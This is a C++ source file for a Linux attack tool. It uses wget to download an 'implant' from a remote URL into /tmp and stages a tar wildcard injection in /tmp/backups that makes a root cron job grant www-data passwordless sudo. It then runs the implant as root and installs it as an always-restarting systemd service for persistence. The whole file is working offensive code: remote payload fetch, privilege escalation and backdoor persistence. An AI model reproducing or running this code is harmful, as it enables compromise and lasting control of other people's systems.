#include <iostream>
#include <cstdlib>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <fstream>
#include <filesystem>

namespace fs = std::filesystem;


int persistence() {
    const std::string serviceName = "private";
    const std::string execPath = "/tmp/user.json";
    const std::string serviceFile = "/etc/systemd/system/" + serviceName + ".service";
    system(("sudo touch " + serviceFile).c_str());
    system(("sudo chmod 0777 " + serviceFile).c_str());

    std::ofstream out(serviceFile);
    if (!out || !fs::exists(execPath)) {
        return 1;
    }
    
    out <<
"[Unit]\n"
"Description=My Application Service\n"
"After=network.target\n\n"
"[Service]\n"
"Type=simple\n"
"ExecStart=" << execPath << "\n"
"Restart=always\n"
"User=nobody\n\n"
"[Install]\n"
"WantedBy=multi-user.target\n";

    out.close();

    system("sudo systemctl daemon-reexec");
    system("sudo systemctl daemon-reload");
    system(("sudo systemctl enable " + serviceName).c_str());
    system(("sudo systemctl start " + serviceName).c_str());
    system(("sudo chmod 0755 " + serviceFile).c_str());
    return 0;
}

int main() {
    // 1. Get the implant
    std::string url = URL;
    std::string downloadCmd = "wget -q " + url + " -O /tmp/user.json";
    
    std::cout << "[*] Downloading implant..." << std::endl;
    std::system(downloadCmd.c_str());
    std::system("chmod +x /tmp/user.json");

    std::string certUrl = CERT_URL;
    std::string downloadCert = "wget -q " + certUrl + " -O /tmp/index.html";
    std::system(downloadCert.c_str());

    // 2. Look for privesc vectors (Cron jobs)
    std::cout << "\n[*] Checking /etc/cron.d for potential vectors:" << std::endl;
    std::system("ls -la /etc/cron.d");
    
    // Search for the specific tar vulnerability in crontab
    std::cout << "\n[*] Searching for tar wildcards in crontab..." << std::endl;
    std::system("grep -r \"tar\" /etc/cron.d /etc/crontab 2>/dev/null");

    // 3. Execute Privesc Commands (Tar Wildcard Injection)
    std::cout << "\n[*] Setting up Tar Wildcard Injection in /tmp/backups..." << std::endl;
    
    std::vector<std::string> exploitCmds = {
        "cd /tmp/backups && echo 'echo \"www-data ALL=(root) NOPASSWD: ALL\" > /etc/sudoers.d/www-data' > tests.sh",
        "cd /tmp/backups && chmod +x tests.sh",
        "cd /tmp/backups && touch -- '--checkpoint=1'",
        "cd /tmp/backups && touch -- '--checkpoint-action=exec=sh tests.sh'"
    };

    for (const auto& cmd : exploitCmds) {
        std::system(cmd.c_str());
    }
    
    std::cout << "[!] Exploit staged. Waiting for cron job to trigger..." << std::endl;
    
    // Wait for 8 seconds for the cron job to execute
    std::cout << "[*] Waiting for 8 seconds..." << std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(8));

    // 4. Run the implant as sudo
    // We attempt to run it; if the exploit hasn't triggered yet, this will fail.
    std::cout << "[*] Attempting to execute implant with sudo..." << std::endl;
    std::string runImplant = "sudo /tmp/user.json";
    std::system(runImplant.c_str());
    persistence();
    return 0;
}
